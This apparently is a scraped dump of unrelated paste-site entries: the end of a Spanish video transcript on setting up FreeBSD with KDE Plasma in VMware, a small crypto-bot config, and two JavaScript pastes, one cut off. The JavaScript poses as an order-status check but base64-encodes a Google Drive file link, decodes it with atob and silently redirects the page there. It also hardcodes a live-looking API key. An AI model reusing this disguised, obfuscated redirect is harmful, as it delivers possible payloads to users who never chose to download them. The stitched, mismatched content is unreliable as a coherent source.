          ""19:54"": ""como le queráis Llamar al rc.com si os fijáis Pues ahora tenemos ahí a habitado""
        },
        {
          ""19:59"": ""Divas bien visto esto Pues también tenemos que habilitar sddm pues lo""
        },
        {
          ""20:05"": ""haremos de misma manera un sis rc un stdm""
        },
        {
          ""20:11"": ""enable igual Yes Y en este caso pues lo quiero""
        },
        {
          ""20:18"": ""configurar en español pues para ello lo que haría Ahora es con el mismo aquí le""
        },
        {
          ""20:24"": ""cambiaría esto por un s o más bien""
        },
        {
          ""20:29"": ""y aquí en vez de poner enable le pongo lang de""
        },
        {
          ""20:34"": ""Language le daríamos y ya nos lo ha añadido Si volvemos a hacer un Cat al rcc vemos que nos ha añadido esas líneas""
        },
        {
          ""20:43"": ""para habilitar esos servicios en el inicio del sistema Y bueno pues con esto""
        },
        {
          ""20:48"": ""pues prácticamente ya Lo tendríamos Cuál es el reto de este vídeo pues que lo""
        },
        {
          ""20:53"": ""estoy instalando en una máquina virtual y necesito Open BM Tools y Open BM Tools pues no funciona de la misma manera que""
        },
        {
          ""21:00"": ""puede funcionar en sistemas basados en Linux por lo tanto Aquí tengo que instalar varias cosas y para ello lo""
        },
        {
          ""21:06"": ""primero que hacer es un pkg install y vamos a instalar un""
        },
        {
          ""21:14"": ""xf86 ion video que es el Driver del vídeo para""
        },
        {
          ""21:19"": ""vmware también vamos a instalar un xf 86""
        },
        {
          ""21:26"": ""input V Mod o BM Mouse y ya por último el open BM""
        },
        {
          ""21:41"": ""Tools dice que va a descargar 14 ficheros con las dependencias que""
        },
        {
          ""21:47"": ""ocuparán 35 meg de espacio y que la descarga son de 6 megas le decimos que sí que nos las""
        },
        {
          ""21:54"": ""instale y ya las tendríamos instaladas tanto los ders de como de entrada del mouse como las Open""
        },
        {
          ""22:02"": ""BM Tools limpio pantalla y al igual que hemos hecho con shk tenemos que""
        },
        {
          ""22:07"": ""habilitar los servicios en los levels de rc para que me detecte lo que son los""
        },
        {
          ""22:13"": ""drivers de la máquina virtual pues para ello voy a hacer un sis rc""
        },
        {
          ""22:21"": ""bware guest vm block""
        },
        {
          ""22:29"": ""enable igual Yes y ahora pues tengo que ir""
        },
        {
          ""22:36"": ""habilitando todos los servicios de vmware Pues el siguiente sería""
        },
        {
          ""22:42"": ""vm hgfs lo""
        },
        {
          ""22:47"": ""habilitamos también el el mem""
        },
        {
          ""22:53"": ""ctl lo habilitamos el BM xnet""
        },
        {
          ""23:00"": ""lo habilitamos y ya por último habilitamos vmware para ello pues borramos esto de""
        },
        {
          ""23:07"": ""aquí y al guest le añadimos una d de guest D enable Yes bien con esto ya""
        },
        {
          ""23:14"": ""tenemos también eh los servicios de vmware activados para que cuando arranquemos fre bsd Pues nos arranque ya""
        },
        {
          ""23:21"": ""con vmware lo que son las las configuraciones de BMW pero Hay que crear el driver en la configuración""
        },
        {
          ""23:29"": ""del entorno gráfico en x11 y para ello Pues voy a hacer un Nano""
        },
        {
          ""23:34"": ""barra user bar local bar etc porque es donde tenemos el""
        },
        {
          ""23:42"": ""etc sl x11 que es donde se encuentra todo lo que es sh y aquí pues buscamos""
        },
        {
          ""23:49"": ""el shor.com d y creamos un archivo de Level que""
        },
        {
          ""23:59"": ""sería 10 vmware.com y Aquí vamos a crear lo que es el el""
        },
        {
          ""24:07"": ""sistema de arranque de de vmware pues tenemos que hacer un""
        },
        {
          ""24:13"": ""section device y un""
        },
        {
          ""24:26"": ""identif que va a ser un Card""
        },
        {
          ""24:33"": ""0 y el Driver que va a ser""
        },
        {
          ""24:39"": ""BMW y ya pues hacemos un end section para terminar este Script lo guardamos""
        },
        {
          ""24:46"": ""lo cerramos y ya tendríamos otra cosa más""
        },
        {
          ""24:52"": ""creada ahora pues al igual tenemos que crear servicios para que nos arranque todo esto y para ello pues haríamos un""
        },
        {
          ""24:59"": ""sis rc en este caso en kld""
        },
        {
          ""25:05"": ""list más igual""
        },
        {
          ""25:12"": ""vmm vm gu zfs cerramos las comillas y me he""
        },
        {
          ""25:19"": ""olvidado de poner unas justamente aquí y ya tenemos el servicio habilitado""
        },
        {
          ""25:26"": ""también en el rc y ahora pu para que todo esto funcione necesitamos fuse y para ello pues vamos a habilitar el""
        },
        {
          ""25:32"": ""servicio de f o fuse dentro de de esta lista le daríamos y ya tenemos también""
        },
        {
          ""25:39"": ""fuse habilitado ya con esto podríamos intentar cargar ahora el Driver que""
        },
        {
          ""25:45"": ""seguramente que me de fallo porque no estoy en el usuario sino en el Root con un""
        },
        {
          ""25:52"": ""kld loas vmm y efectivamente""
        },
        {
          ""25:59"": ""me da el error porque no está registrado aún porque no hemos reiniciado el sistema es lo más lógico bien ya con esto pues""
        },
        {
          ""26:06"": ""prácticamente tenemos bastante avanzado ahora tenemos que decirle a sddm que lo""
        },
        {
          ""26:12"": ""que queremos es que nos arranque plasma pues para ello vamos a hacer un Nano barra user bar local barra""
        },
        {
          ""26:22"": ""etc sdm.com""
        },
        {
          ""26:28"": ""aquí tenemos lo de Deshabilitar el teclado virtual el método de entrada Que""
        },
        {
          ""26:33"": ""de momento no lo voy a tocar pero sí que voy a poner aquí entre corchetes session y dentro de session le vamos a""
        },
        {
          ""26:42"": ""Añadir un session igual a""
        },
        {
          ""26:47"": ""plasma desktop para que nos arranque lo que es el escritorio y ya de paso Pues le voy a""
        },
        {
          ""26:55"": ""habilitar el bloque numérico ya que sabéis que soy muy quisquilloso para estas cosas y para ello voy a hacer un""
        },
        {
          ""27:03"": ""general general vale Y aquí pues le ponemos""
        },
        {
          ""27:09"": ""un lock igual""
        },
        {
          ""27:15"": ""on y ya con eso pues también tenemos configurado el""
        },
        {
          ""27:21"": ""sddm ahora voy a instalar eh algo que no se suele instalar con kd5 que es lo que""
        },
        {
          ""27:28"": ""son los ajustes del gritter y para ello tenemos que instalar el pkg install plasma 5""
        },
        {
          ""27:38"": ""sddm kcm para luego poder configurar el""
        },
        {
          ""27:44"": ""gritter le digo que sí y ya me lo ha""
        },
        {
          ""27:49"": ""instalado y ahora pues tenemos que configurar el gritter para que nos aparezca la""
        },
        {
          ""27:55"": ""pantalla del login en en el inicio del sistema y lo primero""
        },
        {
          ""28:02"": ""que tenemos que saber es la salida de gráfica que tenemos que de normal pues haría con un un x ran Dr si mal no""
        },
        {
          ""28:12"": ""recuerdo y no me puede enseñar el display porque no está cargado lógicamente por lo tanto ante la duda""
        },
        {
          ""28:19"": ""pues podemos utilizar un default y para ello haríamos un x ran""
        },
        {
          ""28:29"": ""Dr gu gu output""
        },
        {
          ""28:34"": ""default si sabéis el tipo de gráfica pues la podéis Añadir directamente""
        },
        {
          ""28:42"": ""Mode y en mi caso pues Quiero una resolución de 1920 por""
        },
        {
          ""28:49"": ""1080 le damos y can open display no me deja Vale pues vamos a""
        },
        {
          ""28:56"": ""crear directamente scpt y para ello voy a limpiar lo que es la pantalla y en este caso pues vamos a hacer""
        },
        {
          ""29:02"": ""un Nano barra user barra local""
        },
        {
          ""29:11"": ""barra share bar sddm bar Script""
        },
        {
          ""29:20"": ""barra xs up y así cuando arranque la próxima vez""
        },
        {
          ""29:26"": ""pues ya tendré estos comand dos Y bueno pues aquí dentro del x""
        },
        {
          ""29:32"": ""Setup vamos a añadirle lo que hemos escrito antes el""
        },
        {
          ""29:38"": ""xr Rd o Dr siempre me confundo Aquí tengo""
        },
        {
          ""29:45"": ""dislexia output""
        },
        {
          ""29:51"": ""default Mode 1920 por 1080""
        },
        {
          ""29:58"": ""y guardarías y ya la próxima vez que arranquemos nos aparecerá el gritter ya a pantalla completa en mi caso pues 1920""
        },
        {
          ""30:05"": ""por 10080 limpiamos y ya otra cosa menos ahora tengo que cambiarle lo que es el""
        },
        {
          ""30:11"": ""idioma de la interfaz y para ello pues tendría que entrar como mi usuario Así que voy a salir de""
        },
        {
          ""30:18"": ""root entro como mi usuario y aquí ahora pues haría un""
        },
        {
          ""30:26"": ""Nano la diéresis esta que en mi caso es con alt graphic y el número cuat barra""
        },
        {
          ""30:32"": ""pun login barra baja conf perfecto y aquí pues destilamos""
        },
        {
          ""30:40"": ""estas tres líneas y en esta de aquí si os fijáis viene con idioma ISO y yo en""
        },
        {
          ""30:46"": ""mi caso pues la quiero con utf 8 y aquí viene el idioma alemán que""
        },
        {
          ""30:54"": ""lo borraría y aquí pues le pondríamos Un s baraj s""
        },
        {
          ""31:02"": ""mayúscula en mi caso de España utf gu 8 y ya con eso también""
        },
        {
          ""31:09"": ""tenemos la interfaz cambiada al español todo esto Son son archivos que puedes""
        },
        {
          ""31:15"": ""modificar en K plasma directamente en Linux también por eso lo estoy haciendo""
        },
        {
          ""31:20"": ""así Ni más ni menos ya podríamos cerrar y ya Lo""
        },
        {
          ""31:25"": ""tendríamos ahora tambén cambiar el idioma del perfil que en este caso pues""
        },
        {
          ""31:31"": ""haría un Nano la diéresis""
        },
        {
          ""31:36"": ""barto profile si lo escribo""
        },
        {
          ""31:42"": ""bien y aquí pues al final del todo añadimos un export todo esto viene en la""
        },
        {
          ""31:49"": ""documentación de K plasma vale pu si os estáis aquí volviendo locos export""
        },
        {
          ""31:58"": ""igual es es""
        },
        {
          ""32:07"": ""utf-8""
        },
        {
          ""32:13"": ""export lc all igual es""
        },
        {
          ""32:22"": ""es utf 8 y""
        },
        {
          ""32:30"": ""Language igual es es""
        },
        {
          ""32:35"": ""utf o8 ya con eso también tendríamos lo que es el entorno de escritorio en""
        },
        {
          ""32:42"": ""español ya podríamos cerrarlo y otra cosa más""
        },
        {
          ""32:51"": ""realizada Bueno ahora viene el momento de la verdad y es cuando tenemos que reiniciar""
        },
        {
          ""32:58"": ""y a ver si nos arranca el sistema voy a hacer un sudo reboot nos pide la contraseña Y si os""
        },
        {
          ""33:03"": ""fijáis me sale con asteriscos por el pw feedback le""
        },
        {
          ""33:10"": ""daríamos Y si todo ha salido bien en el siguiente inicio ya entraríamos en K de""
        },
        {
          ""33:21"": ""plasma y bien podemos apreciar que tenemos aquí el gritter en español en""
        },
        {
          ""33:27"": ""1080 con k de plasma y desde aquí pues ya tengo el""
        },
        {
          ""33:33"": ""bloque numérico activado y simplemente pues tengo que meter la contraseña y arrancar por primera""
        },
        {
          ""33:40"": ""vez y bien pues ya tenemos aquí free bcd con k de plasma con x11 y""
        },
        {
          ""33:48"": ""voy a hacer un control alt + t para abrir una terminal y voy a instalar una serie de""
        },
        {
          ""33:54"": ""cosas que siempre hago cuando hago cualquier vídeo del que en este caso pues sería un sudo pkg""
        },
        {
          ""34:04"": ""install neofetch Fast F htp y bp por ejemplo nos pide la""
        },
        {
          ""34:14"": ""contraseña de""
        },
        {
          ""34:20"": ""root decimos que sí y que nos las instale bien con esto lo primero que""
        },
        {
          ""34:25"": ""hacer es un fast y vamos a ver el sistema en este caso tenemos un free bsel kernel 14.1""
        },
        {
          ""34:33"": ""Release lleva menos de un minuto arrancado tiene 994 paquetes la shell es""
        },
        {
          ""34:39"": ""sh y bueno Yo soy muy de bash Así que esto posiblemente lo cambiamos ahora""
        },
        {
          ""34:44"": ""resolución 1080 plasma 5271 con el Windows manager el kwin nx11""
        },
        {
          ""34:51"": ""el tema visual Bris en qt5 y en gtk la terminal es una cons""
        },
        {
          ""34:58"": ""2385 y el consumo de memoria ahora mismo es de 1,52 gb básicamente y bien pues en""
        },
        {
          ""35:06"": ""este caso lo primero que voy a hacer es revisar que efectivamente el teclado no lo tengo en español y para ello me voy a""
        },
        {
          ""35:13"": ""ir aquí a la configuración y lo primero que voy a""
        },
        {
          ""35:19"": ""hacer que lo hago siempre en cade es que los iconos se seleccionen y que no se me abran que me vuelve loco y ahora pues""
        },
        {
          ""35:27"": ""voy Buscar lang en teclado y aquí lo tenemos también vamos a activar aquí el""
        },
        {
          ""35:32"": ""bloque numérico le damos a aplicar y en distribuciones marcamos la configuración""
        },
        {
          ""35:38"": ""de distribuciones le damos a Añadir Y en este caso Yo quiero la de español de teclas Windows la acepto la selecciono""
        },
        {
          ""35:46"": ""la subo de nivel y la de inglés la elimino aplicar y ahora se supone que ya si""
        },
        {
          ""35:54"": ""escribo aquí una tilde con la o ya me aparece con la la tilde con laado eso ya""
        },
        {
          ""35:59"": ""lo he solucionado qué más voy a hacer Pues ahora mismo necesito un navegador y el que viene predeterminado este de aquí""
        },
        {
          ""36:06"": ""el no este no es que no pues no tiene navegador pensaba que sí que lo llevaba""
        },
        {
          ""36:12"": ""lo que voy a hacer es un sudo pkg install""
        },
        {
          ""36:18"": ""firefox por ejemplo""
        },
        {
          ""36:28"": ""le digo que""
        },
        {
          ""36:34"": ""sí y ya nos lo ha instalado Pues ahora simplemente Busco""
        },
        {
          ""36:39"": ""firefox Lo abro y como es la primera vez que abro""
        },
        {
          ""36:45"": ""firefox se puede demorar un poco así que vamos a esperar y Bueno pues firefox viene en""
        },
        {
          ""36:53"": ""inglés por lo tanto me voy aquí a settings buscamos""
        },
        {
          ""37:00"": ""Language y se lo cambiamos por español que nos lo ponga todo en español me he""
        },
        {
          ""37:06"": ""creado una chuleta para no demorarme mucho para instalar bash Y bueno pues Aquí tengo La Chuleta para poder""
        },
        {
          ""37:13"": ""instalar bash tanto para usuario como para Root y me he creado La Chuleta Más""
        },
        {
          ""37:18"": ""que nada porque si tengo que estar tecleando todo esto me daría la risa por lo tanto ahora simplemente pues tengo""
        },
        {
          ""37:24"": ""que ir copiando primero que voy hacer es habilitar bash y para habilitar bash lo""
        },
        {
          ""37:30"": ""primero que tengo que saber es si hay bash instalado para ello hago un sudo pkg install""
        },
        {
          ""37:37"": ""bash y nos dice que está instalado perfecto pues copio que para mi usuario""
        },
        {
          ""37:44"": ""utilice bash nos pide la contraseña de Root y la información del usuario se ha""
        },
        {
          ""37:51"": ""instalado Vale ahora también habilitamos bash para Root lo pegarías""
        },
        {
          ""37:59"": ""y la información del usuario también se ha actualizado ahora tendría que copiar todo este código que lo que hace es""
        },
        {
          ""38:05"": ""crearme este código dentro de mi carpeta de usuario en un punto bash""
        },
        {
          ""38:12"": ""rc y aquí pues la pegarías y ahora si hacemos un""
        },
        {
          ""38:21"": ""ls barra bash""
        },
        {
          ""38:28"": ""bash rc vemos que nos ha creado ese archivo ahora tendríamos que hacer lo""
        },
        {
          ""38:34"": ""mismo con Root y para ello Pues en este caso tenemos que hacer un sudano Root b""
        },
        {
          ""38:40"": ""rc y aquí pues copiar el mismo porque es prácticamente el mismo para para Root lo""
        },
        {
          ""38:48"": ""pegarías guardarías y saldríamos ahora vamos a crear lo que es""
        },
        {
          ""38:54"": ""el bash profile""
        },
        {
          ""38:59"": ""lo pegarías y lo mismo para""
        },
        {
          ""39:08"": ""Root lo pegarías lo guardarías Y cerraría pues simplemente tengo que""
        },
        {
          ""39:13"": ""habilitar bash en el usuario en Root no me hace falta ya lo haré cuando reiniciemos""
        },
        {
          ""39:22"": ""y me dice que no funciona""
        },
        {
          ""39:28"": ""algo me ha fallado Aquí voy a ver ls bar""
        },
        {
          ""39:34"": ""home barra""
        },
        {
          ""39:40"": ""soplos si hag un menos a y ha desaparecido bash no sé por""
        },
        {
          ""39:51"": ""qué De hecho si me vengo aquí a la carpeta y hago un control H""
        },
        {
          ""39:59"": ""tenemos el bash profile y el bash Pues sí que está bash""
        },
        {
          ""40:13"": ""rc pues ahora no quiere funcionar No Bueno pues si no me funciona en el siguiente reinicio lo lo activará digo""
        },
        {
          ""40:22"": ""yo porque si hago con sudo comand not Found""
        },
        {
          ""40:29"": ""Bueno ahora veremos si funciona o no funciona cuando reiniciemos porque tenemos que reiniciar pero es""
        },
        {
          ""40:42"": ""raro voy a revisar antes de reiniciar si lo hemos copiado bien esto""
        },
        {
          ""41:10"": ""y nada pues voy a reiniciar y a ver si funciona""
        },
        {
          ""41:22"": ""BS bien hemos reiniciado a ver y efectivamente ya me funciona bash ya lo podemos ver en color verde si hago un su""
        },
        {
          ""41:29"": ""men l también me aparece en verde por lo tanto ya está funcionando B no sé por""
        },
        {
          ""41:37"": ""qué no me ha dejado ejecutarlo de primeras pero ya Lo tendríamos De hecho si hacemos un Fast""
        },
        {
          ""41:42"": ""fetch pues ya podemos ver que el shell es bash 5237 y ahora mismo Pues está""
        },
        {
          ""41:48"": ""consumiendo 1,4 GB de memoria RAM Ya pues con esto Lo tendríamos""
        },
        {
          ""41:53"": ""prácticamente funcionando qué más podemos hacer pues lo primero que que haría aquí es""
        },
        {
          ""41:59"": ""colocar firefox en su sitio eh la tienda Discover voy a abrirla para que lo""
        },
        {
          ""42:05"": ""veáis no es funcional básicamente porque free SD no funciona con sistemas de paquetes como hace Linux Y bueno pues""
        },
        {
          ""42:12"": ""aquí nos muestra errores de que no funciona y no lo podemos utilizar pero sí que podemos utilizar para lo que es""
        },
        {
          ""42:19"": ""el sistema de paquetería un sudo pkg install octo pkg""
        },
        {
          ""42:29"": ""que bueno pues Sería más o menos como octopi o como synaptic en sistemas""
        },
        {
          ""42:34"": ""basados en""
        },
        {
          ""42:39"": ""devan y ahora pues si buscamos aquí en el menú de inicio""
        },
        {
          ""42:46"": ""octo aquí lo tenemos nos pide la contraseña de""
        },
        {
          ""42:51"": ""Root y aquí ya tenemos un centro de software de free bcd digamos muy al estilo octopi""
        },
        {
          ""42:59"": ""o o synaptic donde podemos Buscar los paquetes e instalarlos""
        },
        {
          ""43:06"": ""básicamente Y bueno pues ya prácticamente tenemos todo lo que es el sistema instalado y funcionando ahora sí""
        },
        {
          ""43:12"": ""que haría un sudo pkg install yo que sé por ejemplo""
        },
        {
          ""43:21"": ""Thunderbird un Thunder un libre Office""
        },
        {
          ""43:26"": ""un blc por ejemplo y las instalaría Y bueno pues mientras se""
        },
        {
          ""43:33"": ""instalan las aplicaciones que le he dicho pues quitaría de aquí Discover y anclara la terminal aquí""
        },
        {
          ""43:40"": ""a la barra de tareas pondría más o menos todo esto a mi gusto y ahora empezaríamos a""
        },
        {
          ""43:46"": ""personalizarlo vamos a esperar a que se instalen estos programas y ya directamente empezamos a personalizar""
        },
        {
          ""43:52"": ""free bcd bien bien una vez terminado de""
        },
        {
          ""43:58"": ""Instalar los programas pues me iría aquí buscaría Thunderbird lo anclara a la""
        },
        {
          ""44:03"": ""barra de tareas y vlc""
        },
        {
          ""44:16"": ""también y ya pues prácticamente tendría free bsd funcionando y listo para""
        },
        {
          ""44:23"": ""empezar a trabajar pero podemos hacer varias cosas lo primero vamos a empezar a personalizarlo y lo primero que voy a""
        },
        {
          ""44:30"": ""hacer es irme aquí a la carpeta y cambiar ciertas configuraciones que odio lo primero voy a cambiar un poco lo que""
        },
        {
          ""44:37"": ""son las dimensiones con un control H voy a volver a ocultar los archivos ocultos""
        },
        {
          ""44:42"": ""y aquí en configurar Dolphin lo primero que voy""
        },
        {
          ""44:47"": ""a hacer es irme a inicio y que siempre me abra la misma carpeta cuando le dé a la carpeta que no me vaya mostrando""
        },
        {
          ""44:53"": ""pestañas que eso a mí me vuelve loco ya con esto podemos observar en dolfin que no tenemos sistemas de raíz están""
        },
        {
          ""45:00"": ""ocultos para que no toquemos nada pero si nos vamos aquí podemos irnos al Slash y ya vemos el sistema de carpetas que""
        },
        {
          ""45:07"": ""tiene free bsd desde un principio tenemos Bin Boot dep etc home Live lexe""
        },
        {
          ""45:14"": ""media mnt net Proc resource Root sbin temp user bar Z Root pero como os decía""
        },
        {
          ""45:22"": ""casi todo está aquí en user local y aquí tenemos Las verdaderas carpetas el Bin""
        },
        {
          ""45:28"": ""cmake ltc include lip lip 32 lip Data lip exe que estas son las de normal""
        },
        {
          ""45:34"": ""suelen estar en raíz en Linux y aquí pues están dentro de user local básicamente De hecho si entramos en el""
        },
        {
          ""45:40"": ""en ltc buscamos el rc aquí tenemos el sistema de inicio con los room levels""
        },
        {
          ""45:47"": ""digamos con los servicios que están creados para que inicie el sistema""
        },
        {
          ""45:53"": ""operativo y bueno visto esto pues vamos a personalizar ya un poquito free bcd en""
        },
        {
          ""45:59"": ""este caso como no es Linux me niego a ponerle mi wallpaper pero si le vamos a poner alguno orientado a free""
        },
        {
          ""46:07"": ""bsd para ponerle un wallpaper lo primero que hay que hacer es buscarlo y""
        },
        {
          ""46:16"": ""descargarlo y para ello Pues nos venimos aquí a s""
        },
        {
          ""46:24"": ""Google y buscamos un free bsd""
        },
        {
          ""46:30"": ""wallpaper nos vamos a imágenes y bueno este de aquí me ha""
        },
        {
          ""46:37"": ""llamado la atención es un 1280 por 1024 pero no me""
        },
        {
          ""46:46"": ""disgusta abrir imagen una nueva pestaña y aquí lo""
        },
        {
          ""46:51"": ""tenemos pues le damos a guardar imagen como nos a imágenes y la vamos a llamar""
        },
        {
          ""46:59"": ""wallpaper por""
        },
        {
          ""47:08"": ""ejemplo limpio la descarga cerraría por ahora firefox no me hace falta ya por""
        },
        {
          ""47:13"": ""ahora y aquí pues con el botón derecho del Ratón definir como fondo de escritorio Y bueno pues aquí lo tenemos""
        },
        {
          ""47:21"": ""la verdad que queda chulo pero ahora no pega el entorno de escritorio con este fondo de pantalla""
        },
        {
          ""47:27"": ""bien nos vamos a ir a configuración por si tenemos que tocar cositas y aquí pues le vamos a dar un""
        },
        {
          ""47:34"": ""tema oscuro que parece que le pega más y en""
        },
        {
          ""47:40"": ""aspecto me iría la pantalla de bienvenida decade y aquí pues le vamos a""
        },
        {
          ""47:47"": ""Añadir una de free""
        },
        {
          ""47:52"": ""bsd la instalamos""
        },
        {
          ""47:58"": ""y se la aplicamos ya con eso pues tenemos bastante avanzado de aquí podría""
        },
        {
          ""48:05"": ""tocar cursores iconos Y tal Pero no lo voy a hacer lo que sí que voy a hacer""
        },
        {
          ""48:11"": ""aquí es configurar el escritorio y la imagen de fondo y aquí en""
        },
        {
          ""48:16"": ""ubicación le vamos a poner la ubicación de Home para que me muestre los iconos""
        },
        {
          ""48:21"": ""del escritorio en este caso pues la carpeta de usuario y en icono Pues de arriba a""
        },
        {
          ""48:29"": ""abajo y se los pondría un poquito más pequeños ya con eso prácticamente lo""
        },
        {
          ""48:35"": ""tenemos qué más podemos hacer Añadir la papelera y para ello nos vamos al modo de edición de""
        },
        {
          ""48:41"": ""cade nos vamos a Añadir elementos gráficos y buscamos papelera la""
        },
        {
          ""48:50"": ""arrastramos y la colocamos donde quedamos yo la coloco aquí y ya estaría ya que estoy aquí pues me voy a editar""
        },
        {
          ""48:57"": ""el panel o la barra de tareas en más opciones le voy a decir que la quiero""
        },
        {
          ""49:03"": ""transparente y flotante y ya pues con eso prácticamente lo tenemos Qué más le""
        },
        {
          ""49:10"": ""podemos hacer sabéis que soy muy quisquilloso para estas cosas me iría aquí a Configura del lanzador de""
        },
        {
          ""49:16"": ""aplicaciones le cambiaría el icono de cade por uno de free bsd y para ello me voy a examinar y en la raíz en Boot""
        },
        {
          ""49:25"": ""tenemos una carpeta que se llama Im con cosas de free bcd y le añadiría el logo de free bcd que no es que le quede muy""
        },
        {
          ""49:31"": ""bien pero bueno ahí lo tiene Qué pasa que esto lo veo muy""
        },
        {
          ""49:36"": ""grande me voy a otra vez a entrar en el modo de edición y el lo que es la barra de""
        },
        {
          ""49:42"": ""tareas le voy a cambiar el tamaño a 30 Uy no me ha""
        },
        {
          ""49:50"": ""dejado a 36 píxeles ya con eso otra cosa""
        },
        {
          ""49:55"": ""más ya por último al ser free bsd no tiene playm No le podemos instalar playm""
        },
        {
          ""50:02"": ""además que playmouth funciona con systemd básicamente y aquí no lo tenemos""
        },
        {
          ""50:08"": ""pero podemos añadirle una línea que en el Boot lader""
        },
        {
          ""50:14"": ""para que nos muestre un splash Lo que pasa que lo muestra durante muy poco tiempo pero algo es algo y para ello voy""
        },
        {
          ""50:19"": ""a hacer un sudo Nano barbot bar loader.com""
        },
        {
          ""50:28"": ""nos pide la contraseña de Root y aquí al final del todo pues le voy a Añadir un""
        },
        {
          ""50:36"": ""Boot barra baja mute igual""
        },
        {
          ""50:42"": ""Yes guardaría y cerraría y ya pues Solo queda reiniciar y ver el resumen del""
        },
        {
          ""50:55"": ""vídeo Tenemos aquí la pantalla del""
        },
        {
          ""51:05"": ""splash y una vez que nos logueamos pues tenemos esta pantalla bienvenida también de free""
        },
        {
          ""51:11"": ""bsd Y bueno pues ya lo tenemos instalado terminado personalizado configurado Y""
        },
        {
          ""51:17"": ""por último pues vamos a hacer un Fast fetch y vemos que tenemos un kernel fre""
        },
        {
          ""51:23"": ""bcd 141 con 54 paquetes B""
        },
        {
          ""51:28"": ""523 con la resolución el plasma etcétera y un consumo de 1,49 gibs si hago un""
        },
        {
          ""51:36"": ""neofetch vemos Que prácticamente es lo mismo y el""
        },
        {
          ""51:42"": ""consumo Es el mismo si os fijáis aquí no difiere de fast fetch a neofetch como en distribuciones Linux marca prácticamente""
        },
        {
          ""51:49"": ""lo mismo si hago un H top marca prácticamente lo""
        },
        {
          ""51:55"": ""mismo Y si hago un bitop aquí me marca menos bitop me marca""
        },
        {
          ""52:00"": ""1,25 imagino porque ya habrá terminado de hacer arranques Pero bueno Esto es""
        },
        {
          ""52:06"": ""free bsd qué deciros sobre este sistema Pues""
        },
        {
          ""52:11"": ""para mí ha sido un reto el poder instalarlo en una máquina virtual pero aquí lo tenemos funcionando con kd5 con""
        },
        {
          ""52:17"": ""x11 y la verdad que bastante contento porque he aprendido bastante de cómo""
        },
        {
          ""52:23"": ""instalar este sistema Cómo funcionan los sistemas ya que no no es me podéis hacer el hate""
        },
        {
          ""52:29"": ""de es que no es Linux Sí pero consiste en aprender y aquí pues yo he aprendido y me sirve como bagaje me ha resultado""
        },
        {
          ""52:37"": ""interesante Sí que es verdad que no tiene nada que ver con Linux en muchas cosas pero también tiene muchas""
        },
        {
          ""52:43"": ""similitudes con gnu Linux no y lo dicho pues me ha resultado muy""
        },
        {
          ""52:49"": ""interesante lo recomendaría No ni mucho menos a no ser de que quieras trastear y""
        },
        {
          ""52:55"": ""quieras hacer un poco de de distro hopping con fre bsd que la verdad pues sirve para aprender un poquito más sobre""
        },
        {
          ""53:03"": ""Cómo comenzó todo lo que es la filosofía unix y lo que es la filosofía""
        },
        {
          ""53:09"": ""Linux una vez que lo instalas pues no deja de ser otro sistema operativo más""
        },
        {
          ""53:14"": ""muy similar a Linux Pero bueno son filosofías totalmente opuestas pero la""
        },
        {
          ""53:20"": ""verdad que me ha gustado mucho poder crear Este vídeo Eh me ha gustado trastear investigar Y bueno pues Pues""
        },
        {
          ""53:26"": ""aquí lo tenéis free bsd con k de plasma 5 con x11 y lo que os dije si en un futuro queréis que haga un vídeo de free""
        },
        {
          ""53:33"": ""bsd con KD plasma 6 y wand pues hacérmelo saber y me volveré a romper los cuernos para poder lograrlo ya que""
        },
        {
          ""53:40"": ""no es nada fácil pero nada fácil pero por lo menos me me ha resultado muy entretenido y por eso esta semana pues""
        },
        {
          ""53:47"": ""no hice el no hice lo que es la encuesta ya que tenía que hacer este vídeo porque""
        },
        {
          ""53:52"": ""me resultó muy muy interesante Así que poco más si os ha gustado hacer hacérmelo saber con un buen Like si no""
        },
        {
          ""53:57"": ""estás suscrito al Canal Pues te invito a que lo hagas ahora mismo y ya de paso pues que le des a la campanita y así te notifican cada vez que subo un vídeo""
        },
        {
          ""54:04"": ""nuevo y nada más chicos que muchísimas gracias por haber visto hasta aquí el vídeo y que nos vemos en el siguiente un""
        },
        {
          ""54:10"": ""saludo""
        }
      ]
    }
  ]
}"
ENGzuKVh,Market.js,luqlegal,JavaScript,Thursday 10th of April 2025 09:34:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10129/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TP8zHQdp,Untitled,devzeus,JSON,Thursday 10th of April 2025 09:26:27 AM CDT,"{""maxamount"": 0.02,""cooldown"": 660, ""grest"": 10, ""max_sol"": 0.0004, ""max_pepe"": 3000}"
huLxXUr3,Untitled,luqlegal,JavaScript,Thursday 10th of April 2025 09:18:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/92375/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

